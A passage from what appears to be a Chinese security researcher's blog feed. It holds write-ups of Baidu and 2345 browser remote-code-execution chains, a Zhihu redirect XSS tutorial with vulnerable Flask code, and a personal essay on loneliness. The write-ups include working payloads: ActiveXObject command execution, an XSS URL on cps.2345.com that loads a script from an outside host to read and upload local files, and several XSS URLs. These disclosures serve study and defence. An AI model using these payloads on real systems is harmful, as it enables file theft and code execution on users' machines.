rel="noopener">http://wooyun.org/bugs/wooyun-2010-083294</a> 寻找一个能够直接修改其默认下载路径的接口，这样子就可以通过下载文件到用户的开机启动路径中完成RCE。不过，百度浏览器修改了这个设置的API，设置时会弹出选择窗口给用户选择路径。<br><img src="http://ww2.sinaimg.cn/large/7184df6bgw1f7eivrv9qwj20hy03waaa.jpg" alt=""><br><img src="http://ww2.sinaimg.cn/large/7184df6bgw1f7eiwf8fu3j213k0ns7ap.jpg" alt=""></p><p>哎，于是，换一个思路吧。我们尝试看看能不能获取到用户设置的默认路径吧！分析调试设置页面的源代码之后，我发现了以下的操作就可以获取到用户的默认路径！</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.external.StartRequest(<span class="number">1162</span>, <span class="string">"fetch_prefs.addListener"</span>, <span class="string">"console.log"</span>, <span class="string">"[]"</span>, <span class="string">""</span>, <span class="built_in">window</span>);</span><br><span class="line"><span class="built_in">window</span>.external.StartRequest(<span class="number">1163</span>, <span class="string">"preference_ready"</span>, <span class="string">""</span>, <span class="string">"[]"</span>, <span class="string">""</span>, <span class="built_in">window</span>);</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/7184df6bgw1f7eiwyv7nfj21020k77pi.jpg" alt=""></p><h3 id="0x03-执行？"><a href="#0x03-执行？" class="headerlink" title="0x03 执行？"></a>0x03 执行？</h3><p>完成文件的下载，我们又知道了文件在用户系统中的绝对路径。这个能干嘛啊？在寻找的过程中，我搜索了一下，找到了这样的一个链接：<a href="http://stackoverflow.com/a/5047811/1634804" target="_blank" rel="noopener">http://stackoverflow.com/a/5047811/1634804</a> 这里是指在IE上通过ActiveXObject启动notepad.exe的代码。想到百度浏览器还有一个IE内核的时候，还是试试吧。没想到一试，发现居然可以直接执行，是的，什么提示都没有。一开始我还怀疑是我自己设置了IE的安全级别，发现测了手上的几个系统，还在虚拟机环境下进行测试，都发现能打开notepad。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">ws=<span class="keyword">new</span> ActiveXObject(<span class="string">"WScript.Shell"</span>);</span></span><br><span class="line"><span class="javascript">ws.Exec(<span class="string">"C:\\Windows\\notepad.exe"</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="http://ww4.sinaimg.cn/large/7184df6bgw1f7eixj8ejhj20ky07gdgq.jpg" alt=""></p><p>而在同一个系统上的IE浏览器，访问这个页面的时候会提示以下的信息。从这可以估计出百度浏览器在使用IE内核的时候，安全性级别设置的比较低。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SCRIPT429: Automation 服务器不能创建对象</span><br></pre></td></tr></table></figure></p><p><img src="http://ww3.sinaimg.cn/large/7184df6bgw1f7eixw2fsmj20fw08375u.jpg" alt=""></p><p>接下来，我们要怎么利用？在使用的过程中，发现百度浏览器大多会先使用WebKit引擎进行渲染，而且，我查了一下，没有任何可以设置的方式。所以，第一个想到的方案是做个界面欺骗用户切换成IE模式，这样子我们的RCE就大打折扣。</p><h3 id="0x04-WebKit-gt-IE"><a href="#0x04-WebKit-gt-IE" class="headerlink" title="0x04 WebKit -&gt; IE"></a>0x04 WebKit -&gt; IE</h3><p>想啊想！心中想起了一句话：中国特色社会主义。在China，很多银行的网站都默认只能使用IE，访问这些网站的时候，百度浏览器会不会很人性化的帮我们切换成IE内核呢？于是，继续测试，发现果然！打开工行，招行等银行的网站时，优先使用的是IE内核。<br><img src="http://ww4.sinaimg.cn/large/7184df6bgw1f7eiyi6sd4j20my04cdgl.jpg" alt=""></p><p>于是，我们只要找到一个网站是银行的，且这个网站存在XSS或者前端界面可控的，就可以通过这个网站执行ActiveXObject了。不过找银行的貌似挺麻烦的，找了一会之后，我把思路换成了学校，因为学校的网站（edu.cn的子域）也是默认优先IE内核。找啊找，找到一个XSS，被IE的过滤器过滤，找到另外一个不会被过滤的，URL长度有限制且有关键词检查。最后，还是在母校找到了一个站点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ecampus.sysu.edu.cn/zsuoa/application/pages/select_frame.jsp?url=http://baidu.com</span><br></pre></td></tr></table></figure></p><p>这个页面会去加载使用iframe去加载url里执订的链接，虽然不是XSS，但是更好用！</p><h3 id="0x05-真的可以执行"><a href="#0x05-真的可以执行" class="headerlink" title="0x05 真的可以执行"></a>0x05 真的可以执行</h3><p>思路总结</p><ol><li>UXSS 到 <a href="https://chajian.baidu.com/2015/" target="_blank" rel="noopener">https://chajian.baidu.com/2015/</a></li><li>修改用户的下载设置：自动下载到默认保存位置 (不再弹窗提醒)</li><li>获取用户的的默认下载路径</li><li>下载一个文件</li><li>跳转到学校的网站，使用ActiveXObject执行我们下载的文件。</li></ol><p>测试的GIF截图，下载并启动Everything。<br><img src="http://ww1.sinaimg.cn/large/7184df6bgw1f7eizhdpabg20t10ktal7.gif" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;案例链接：&lt;a href=&quot;http://wooyun.org/bugs/wooyun-2010-0216027&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://wooyun.org/bugs/wooyun-2010-0216027&lt;/a&gt;&lt;/
      
    
    </summary>
    
    
      <category term="安全" scheme="http://zhchbin.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="XSS" scheme="http://zhchbin.github.io/tags/XSS/"/>
    
      <category term="浏览器安全" scheme="http://zhchbin.github.io/tags/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>[浏览器安全系列一] 2345浏览器本地文件读取及远程命令执行</title>
    <link href="http://zhchbin.github.io/2016/07/23/2345-Browser-RCE/"/>
    <id>http://zhchbin.github.io/2016/07/23/2345-Browser-RCE/</id>
    <published>2016-07-23T15:04:35.000Z</published>
    <updated>2016-10-02T05:43:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>案例链接：<a href="http://wooyun.org/bugs/wooyun-2016-0204520" target="_blank" rel="noopener">http://wooyun.org/bugs/wooyun-2016-0204520</a></p><h3 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h3><h4 id="0x00-chrome-devtools本地文件读取漏洞"><a href="#0x00-chrome-devtools本地文件读取漏洞" class="headerlink" title="0x00 chrome-devtools本地文件读取漏洞"></a>0x00 chrome-devtools本地文件读取漏洞</h4><p>在 <a href="http://www.wooyun.org/bugs/wooyun-2010-0176314" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2010-0176314</a> 中使用到了一个chrome-devtools的一个本地文件读取的漏洞（只有特定几个版本有这个问题，现在已经修复），访问URL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chrome-devtools://devtools/bundled/inspector.html?remoteBase=http://xxx.com/&amp;remoteFrontend=true</span><br></pre></td></tr></table></figure></p><p>就会加载并执行xxx.com下的screencast_module.js，在这个js中，有权限使用DevToolsAPI，利用向外出容器发送类型为loadNetworkResource的消息可以读取到本地文件内容。我写了一个flask程序进行验证，见测试代码。 在C盘新建一个<code>111.txt</code>并写入内容，运行服务器之后，在2345浏览器打开<code>chrome-devtools://devtools/bundled/inspector.html?remoteBase=http://127.0.0.1/file/&amp;remoteFrontend=true</code>。本地测试截图：<br><img src="http://ww1.sinaimg.cn/large/005GzSIagw1f3hwy8nqwcj30ln0bigp3.jpg" alt=""></p><h4 id="0x01-WebKit系浏览器伪协议调用"><a href="#0x01-WebKit系浏览器伪协议调用" class="headerlink" title="0x01 WebKit系浏览器伪协议调用"></a>0x01 WebKit系浏览器伪协议调用</h4><p>在 <a href="http://www.wooyun.org/bugs/wooyun-2010-0175902" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2010-0175902</a> 中，可以通过<code>location.href=&quot;vbefile:/../../../已知路径/1.js&quot;</code>来执行本地文件<code>1.js</code><br><img src="http://ww1.sinaimg.cn/large/005GzSIagw1f3hwyb7kovj30ob0aen1j.jpg" alt=""></p><h3 id="一步一步构造PoC"><a href="#一步一步构造PoC" class="headerlink" title="一步一步构造PoC"></a>一步一步构造PoC</h3><h4 id="0x00-首先我们来思考如何实现读取本地文件"><a href="#0x00-首先我们来思考如何实现读取本地文件" class="headerlink" title="0x00 首先我们来思考如何实现读取本地文件"></a>0x00 首先我们来思考如何实现读取本地文件</h4><p>要让用户自己主动打开：<code>chrome-devtools://devtools/bundled/inspector.html?remoteBase=http://x.xx.com/file/&amp;remoteFrontend=true</code>貌似不太可能，如@gainover提到的，location.href，window.open进行跳转都是会因为安全问题而被浏览器限制，比如：提示Not allowed to load local resource，或打开页面是空白等措施。</p><h4 id="0x01-国产浏览器的毛病"><a href="#0x01-国产浏览器的毛病" class="headerlink" title="0x01 国产浏览器的毛病"></a>0x01 国产浏览器的毛病</h4><p>在很多基于Chromium进行开发的国产浏览器中，厂商都会加入一些自己定制的API来实现一些特定的功能。在2345浏览器中，我发现一个API：<code>chrome.ntp2345.prepareThumbnail</code>，根据名字猜测，这个API应该是用于获取指定URL的HTML页面的截图，也就是说会先访问页面，然后渲染生成缩略图。（因为之前在一个开源项目中实现过类似功能，所以看到这个比较敏感）。进行了尝试之后，发现果然可以执行，并且服务端接收到了发送上来的文件内容，完美地绕过了安全限制！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chrome.ntp2345.prepareThumbnail(&apos;chrome-devtools://devtools/bundled/inspector.html?remoteBase=http://127.0.0.1/file/&amp;remoteFrontend=true&apos;)</span><br></pre></td></tr></table></figure><h4 id="0x02-XSS来帮忙"><a href="#0x02-XSS来帮忙" class="headerlink" title="0x02 XSS来帮忙"></a>0x02 XSS来帮忙</h4><p>发现上面的API之后，我里面写了一个页面进行测试，发现还是有一定的限制，那就是这个API在非2345.com及其子域名下执行的话，会直接返回2并且不会访问制定的URL。怎么办？我们来找个XSS不就绕过了？这里有点幸运，我Google了一下<code>site:2345.com inurl:url</code>就找到了一个使用js进行url跳转的XSS，原理类似于@phith0n的<a href="http://wooyun.org/bugs/wooyun-2016-0179329" target="_blank" rel="noopener">http://wooyun.org/bugs/wooyun-2016-0179329</a> ，不受chrome限制的XSSAuditor一个反射型XSS。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cps.2345.com/go/?bid=2014060633&amp;company_id=33&amp;url=javascript:alert(document.domain);//</span><br></pre></td></tr></table></figure><p><img src="http://ww3.sinaimg.cn/large/005GzSIagw1f3hxp65frrj30j20abju9.jpg" alt=""><br><img src="http://ww3.sinaimg.cn/large/005GzSIagw1f3hxp84i17j30k6098ac5.jpg" alt=""></p><h4 id="0x03-本地文件读取PoC"><a href="#0x03-本地文件读取PoC" class="headerlink" title="0x03 本地文件读取PoC"></a>0x03 本地文件读取PoC</h4><p>服务端代码：<a href="https://gist.github.com/zhchbin/c4f7de8faf8a7cfa6c0f00191277df98#file-2345_poc-py-L199-L240" target="_blank" rel="noopener">https://gist.github.com/zhchbin/c4f7de8faf8a7cfa6c0f00191277df98#file-2345_poc-py-L199-L240</a></p><p>用户点击一下URL，C盘下的111.txt文件内容就被上传到了服务器上，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cps.2345.com/go/?bid=2014060633&amp;company_id=33&amp;url=javascript:s=document.createElement(%27script%27);s.src=%27//a.zhchbin.xyz/file/xss.js%27;document.body.appendChild(s);//</span><br></pre></td></tr></table></figure></p><p>过程总结：cps.2345.com域名下的XSS，加载/file/xss.js，执行chrome.ntp2345.prepareThumbnail(url)访问chrome-devtools:页面，读取本地文件并上传。</p><h4 id="0x04-我们来实现远程命令执行"><a href="#0x04-我们来实现远程命令执行" class="headerlink" title="0x04 我们来实现远程命令执行"></a>0x04 我们来实现远程命令执行</h4><p>原理：（1）上述的chrome-devtools本地文件读取漏洞不仅能读取文件，还能读取文件列表！（2）我们可以通过浏览器的cache机制，写入我们指定的内容到浏览器的cache目录中（3）可以利用WebKit系浏览器伪协议调用执行cache文件。</p><p>2345浏览器的默认cache目录在：C:\Users\%USERNAME%\AppData\Local\2345Explorer\User Data\Default\Cache。要执行这个目录下的cache文件，我们要解决两个问题，首先是找出当前系统的用户名，第二是定位到我们的恶意cache文件。第一个问题，我们可以通过读取C:\Users这个目录下的文件列表，得到用户列表。然后针对每个用户，执行以下的操作来定位恶意cache文件：获取cache目录下的文件列表，保存在localStorage中，然后利用插入img的方式写入恶意cache文件，完成后再获取一次cache目录下的文件列表，找出第二次集合中新增加的文件，上传到服务器中，前端跳转到执行页面，指定iframe的src为<code>vbefile:/../../../../../../../../Users/xxx/AppData/Local/2345Explorer/User Data/Default/Cache/f_xxxx</code>，从而达到命令执行的效果。</p><p>服务端代码：<a href="https://gist.github.com/zhchbin/c4f7de8faf8a7cfa6c0f00191277df98#file-2345_poc-py-L9-L196" target="_blank" rel="noopener">https://gist.github.com/zhchbin/c4f7de8faf8a7cfa6c0f00191277df98#file-2345_poc-py-L9-L196</a><br>用户点击：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cps.2345.com/go/?bid=2014060633&amp;company_id=33&amp;url=javascript:s=document.createElement(%27script%27);s.src=%27//a.zhchbin.xyz/xss.js%27;document.body.appendChild(s);//</span><br></pre></td></tr></table></figure></p><p>测试说明：因为请求有时序依赖，所以里面用了5000毫秒的等待时间，来确保顺序的正确性。测试时可以在修改一下里面的域名变成本地的地址，然后运行。</p><p><img src="http://ww4.sinaimg.cn/large/005GzSIagw1f3hzd1cp2gg30my0fydmr.gif" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;案例链接：&lt;a href=&quot;http://wooyun.org/bugs/wooyun-2016-0204520&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://wooyun.org/bugs/wooyun-2016-0204520&lt;/a&gt;&lt;/
      
    
    </summary>
    
    
      <category term="安全" scheme="http://zhchbin.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="XSS" scheme="http://zhchbin.github.io/tags/XSS/"/>
    
      <category term="浏览器安全" scheme="http://zhchbin.github.io/tags/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>感受孤独</title>
    <link href="http://zhchbin.github.io/2016/06/25/loneliness/"/>
    <id>http://zhchbin.github.io/2016/06/25/loneliness/</id>
    <published>2016-06-25T14:54:03.000Z</published>
    <updated>2018-03-12T11:20:35.756Z</updated>
    
    <content type="html"><![CDATA[<h2 id="感受孤独"><a href="#感受孤独" class="headerlink" title="感受孤独"></a>感受孤独</h2><h3 id="喜欢的一首歌"><a href="#喜欢的一首歌" class="headerlink" title="喜欢的一首歌"></a>喜欢的一首歌</h3><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="280" height="86" src="http://music.163.com/outchain/player?type=2&id=29414037&auto=0&height=66"></iframe><h3 id="距离"><a href="#距离" class="headerlink" title="距离"></a>距离</h3><p>前两天部门老大分享的时候提到了一个事情：心理距离，在餐桌上几个人各自玩着自己的手机却不愿意跟身边的人说说话。这让我想起一件一年前发生在我身上的事情，我和另外一个我认为要好的朋友坐车一起回工作的城市，出发前我设想的是能够和TA好好聊聊，可当我们上车坐下来之后情况与我想象中完全不一样。TA拿起了自己的手机看起了动漫，带上耳机的TA就这么进入了自己的世界。而我也当然识趣地不去打扰。事后想想，那一刻我们虽然就在各自（想用彼此，却发现并不合适）的身边，在心理上却如此的遥远，遥不可及的那种。</p><h3 id="一个人"><a href="#一个人" class="headerlink" title="一个人"></a>一个人</h3><p>我是不是不应该再让这种失意影响到我的生活。我可以一个人坐车，一个人吃完自己做的饭，一个人看完一场电影，一个人地慢慢修行。我似乎太过关心他人的生活，而对自己完全不负责，用一句话形容我此时此刻的心态：我差不多是条咸鱼了（自行脑补表情包呗）。我不断地在寻找那些能够证明自我价值的东西，去让自己获得成就感，以平衡内心的孤独。这种生活状态似乎从大学一开始就埋下了种子。每天重复性的过日子确实很无聊，20-30岁这个年龄阶段，靠着自己煮的鸡汤撑着面对人生。虽然现在慢慢生活有了保障，只要继续熬个几年，会看到出头的日子，但我内心真的很不想这样子过下去，却又无力挣扎，任凭他蹂躏。</p><h3 id="孤独"><a href="#孤独" class="headerlink" title="孤独"></a>孤独</h3><p>所以孤独到底是什么样子？工作了一段时间了，高中，大学所谓的好朋友也各自离去为自己的生活奋斗。这种感受会慢慢得加深，我深知自己也终会有一天进入这种生活状态。我总是在怀念过去，发现物是人非的时候觉得特别孤独。我开始在意以前聊得来的人现在懒得评论我发的朋友圈，主动找他们聊天也会发现距离远了，真的不知道说什么好了。有些人，面对面可以聊得很开，到了微信里就变成了陌生人，时间久了，再见面也只是寒暄。可以说这样子的一句话：他们是我那时候的好朋友啊，就这样子吧。没事多会回家吧！</p>]]></content>
    
    <summary type="html">
    
      孤独只是人生的必修课之一
    
    </summary>
    
    
      <category term="Life" scheme="http://zhchbin.github.io/tags/Life/"/>
    
  </entry>
  
  <entry>
    <title>一个URL跳转引发的一系列“惨案”</title>
    <link href="http://zhchbin.github.io/2016/04/09/Problems-Caused-by-URL-Redirection/"/>
    <id>http://zhchbin.github.io/2016/04/09/Problems-Caused-by-URL-Redirection/</id>
    <published>2016-04-09T05:45:01.000Z</published>
    <updated>2016-10-02T05:43:40.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在知乎的题目和答案中，插入的链接都会变成<code>https://link.zhihu.com/target=xxx</code>的形式进行URL跳转，如下图。然而这个看似简单的功能的实现上，曾引发过一系列的问题，过程挺精彩，所以我就来做个总结，以重新体验一下这个过程。声明：以下小节中提到的问题均来自WooYun已经公开的漏洞，复现的代码也是纯属我个人YY。<br><img src="/images/20160409140054.png" alt="ZhihuURLRedirect"></p><h2 id="0x00-没有任何过滤"><a href="#0x00-没有任何过滤" class="headerlink" title="0x00 没有任何过滤"></a>0x00 没有任何过滤</h2><p>案例：<a href="http://www.wooyun.org/bugs/wooyun-2016-0171240" target="_blank" rel="noopener">知乎 URL 跳转造成的 XSS</a></p><p>猜测知乎可能的实现方式：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    target = request.args.get(<span class="string">'target'</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'''&lt;script&gt;window.location.href = "%s"&lt;/script&gt;'''</span> % (target)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure></p><p>在上面这个实现中，我们可以发现对于<code>&quot;</code>并没有进行转义，因此我们可以传入<code>&quot;</code>来闭合前面的双引号，然后再插入我们的JS代码。运行上面的程序<code>python server.py</code>，然后使用curl请求：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">'127.0.0.1:5000/?target=";alert(1);window.location.href="http://www.zhihu.com'</span></span><br><span class="line">&lt;script&gt;window.location.href = <span class="string">""</span>;alert(1);window.location.href=<span class="string">"http://www.zhihu.com"</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/images/20160409141842.png" alt="XSS_1"></p><h2 id="0x01-对参数做了urlencode编码"><a href="#0x01-对参数做了urlencode编码" class="headerlink" title="0x01 对参数做了urlencode编码"></a>0x01 对参数做了urlencode编码</h2><p>在上面的漏洞报告之后，（猜测）知乎的工程师按照了洞主给出的修复方案进行代码的修改，修改后的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    target = request.args.get(<span class="string">'target'</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'''&lt;script&gt;</span></span><br><span class="line"><span class="string">var URI="%s";</span></span><br><span class="line"><span class="string">window.location.href = decodeURIComponent(URI);</span></span><br><span class="line"><span class="string">&lt;/script&gt;'''</span> % (urllib.quote(target))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><p>现在，我们如果在target参数中传入<code>&quot;</code>，则先会被转义成<code>%22</code>插入在页面中，从而无法闭合之前的双引号。看似一个挺好的的解决方案吧，然而，却还不够。案例：<a href="http://www.wooyun.org/bugs/wooyun-2016-0179329" target="_blank" rel="noopener">知乎某处XSS+刷粉超详细漏洞技术分析</a>。我们可以看到后台将输入的target参数传入给URI参数，解码以后赋值于location.href。问题解决了？没有，可以利用JavaScript:伪协议执行js代码，如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/?target=javascript:alert(1);</span><br></pre></td></tr></table></figure></p><p><img src="/images/20160409143927.png" alt="XSS_2"></p><p>强烈推荐仔细阅读这个案例哦，洞主的分析利用过程保证你看了会觉得很有收获。</p><h2 id="0x02-使用WTForm进行URL校验"><a href="#0x02-使用WTForm进行URL校验" class="headerlink" title="0x02 使用WTForm进行URL校验"></a>0x02 使用WTForm进行URL校验</h2><p>（猜测开发内心OS）既然如此，Python不是有个叫做<code>WTForm</code>的库可以帮我们校验用户的输入是否合法吗？我们可以利用里面的<a href="http://wtforms.readthedocs.org/en/latest/validators.html?highlight=URL#wtforms.validators.URL" target="_blank" rel="noopener">wtforms.validators.URL</a>进行URL的检查，这样子用户的输入该合法了吧。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField</span><br><span class="line"><span class="keyword">from</span> wtforms.form <span class="keyword">import</span> Form</span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired, URL</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UrlForm</span><span class="params">(Form)</span>:</span></span><br><span class="line">    target = StringField(validators=[DataRequired(), URL()])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    form = UrlForm(request.args)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> form.validate():</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Bad Boy!"</span></span><br><span class="line"></span><br><span class="line">    target = form.target.data.encode(<span class="string">'utf8'</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'''&lt;script&gt;</span></span><br><span class="line"><span class="string">var URI="%s";</span></span><br><span class="line"><span class="string">window.location.href = decodeURIComponent(URI);</span></span><br><span class="line"><span class="string">&lt;/script&gt;'''</span> % (urllib.quote(target))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure></p><p>这里也有可能是开发自己写正则进行匹配，问题本质上都是一样的，正则写的不好。上面的写法虽然已经能过滤到前面提到的情况，然而，WTForm的正则过滤并没有写好，导致继续被XSS。如下的URL：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/?target=javascript://www.baidu.com/%E2%80%A8alert(1)</span><br></pre></td></tr></table></figure></p><p><img src="/images/20160409151521.png" alt="XSS_3"></p><p>具体分析见案例<a href="http://www.wooyun.org/bugs/wooyun-2016-0182145" target="_blank" rel="noopener">知乎某处XSS导致刷粉</a>及<a href="http://drops.wooyun.org/papers/13058" target="_blank" rel="noopener">从WTForm的URLXSS谈开源组件的安全性</a></p><h2 id="0x03-除了XSS之外的一个彩蛋"><a href="#0x03-除了XSS之外的一个彩蛋" class="headerlink" title="0x03 除了XSS之外的一个彩蛋"></a>0x03 除了XSS之外的一个彩蛋</h2><p>这里本身其实是一个任意URL调整，可以在某些实现不严格的OAuth2.0的过程中利用偷取用户的授权code，然后使用用户的身份进行登录哦。在我之前的博客已经分析过这个问题，这里就不再写了。案例：<a href="http://www.wooyun.org/bugs/wooyun-2016-0174018" target="_blank" rel="noopener">微博上你点我链接我就上你绑定过的知乎账号</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>做一个程序员不容易啊！请善待我们。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在知乎的题目和答案中，插入的链接都会变成&lt;code&gt;https://link.zhihu.com/target=xxx&lt;/code&gt;的形式进
      
    
    </summary>
    
    
      <category term="安全" scheme="http://zhchbin.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="XSS" scheme="http://zhchbin.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>“脆弱”的微博OAuth 2.0</title>
    <link href="http://zhchbin.github.io/2016/02/16/The-Weakness-of-Weibo-OAuth2-0/"/>
    <id>http://zhchbin.github.io/2016/02/16/The-Weakness-of-Weibo-OAuth2-0/</id>
    <published>2016-02-16T14:19:40.000Z</published>
    <updated>2016-10-02T05:43:40.000Z</updated>
    
